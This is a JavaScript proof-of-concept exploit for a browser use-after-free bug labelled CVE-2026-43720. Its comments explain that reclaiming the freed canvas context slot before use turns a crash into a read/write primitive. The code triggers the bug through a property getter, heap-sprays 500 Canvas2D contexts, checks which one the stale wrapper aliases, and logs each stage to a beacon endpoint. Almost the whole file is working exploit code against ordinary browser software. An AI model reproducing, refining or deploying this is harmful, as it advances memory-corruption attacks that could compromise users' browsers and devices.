// CVE-2026-43720, corrected ordering: RECLAIM BEFORE USE.
//
// On the console the naive version dies every time: after the trigger the 2d context is freed, so the first
// touch of the stale wrapper (inner.lineWidth) lands on unmapped/freed memory and the WebProcess goes down.
// Measured: beacons stop immediately after c014-inner:ctx,outer:ctx.
//
// The slot has to be reclaimed first with same-size Canvas2D contexts, and only then is the stale wrapper
// used - at which point it aliases a live context rather than freed memory. That is the difference between
// a crash and a usable primitive.
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', 'c014-' + t); } catch (e) {} }

  var inner = null;
  var canvas = document.createElement('canvas');
  var opts = {};
  Object.defineProperty(opts, 'alpha', {
    get: function () { inner = canvas.getContext('2d'); return true; }
  });
  var outer = null;
  try { outer = canvas.getContext('bitmaprenderer', opts); }
  catch (e) { send('outer-threw:' + (e && e.name)); }
  send('triggered:' + (inner ? 'ctx' : 'null') + '/' + (outer ? 'ctx' : 'null'));

  // Reclaim the freed slot BEFORE touching the stale wrapper.
  var spray = [];
  for (var i = 0; i < 500; i++) {
    var c = document.createElement('canvas');
    spray.push(c.getContext('2d'));
  }
  send('sprayed:' + spray.length);

  // Tag every spray context with a distinct value, then write through the stale wrapper and see whose value
  // it overwrites. A hit proves the wrapper aliases a live context, i.e. an R/W primitive.
  for (var k = 0; k < spray.length; k++) { try { spray[k].lineWidth = 100 + k; } catch (e) {} }
  var aliased = -1;
  try {
    inner.lineWidth = 4242.5;
    for (var j = 0; j < spray.length; j++) {
      if (spray[j].lineWidth === 4242.5) { aliased = j; break; }
    }
    send('alias-index:' + aliased);

    // Read back through the alias from the spray side to show the write is visible both ways.
    if (aliased >= 0) {
      spray[aliased].lineWidth = 777.25;
      send('readback:' + inner.lineWidth);
    }
  } catch (e) { send('alias-threw:' + (e && e.name)); }
  send('done');
})();
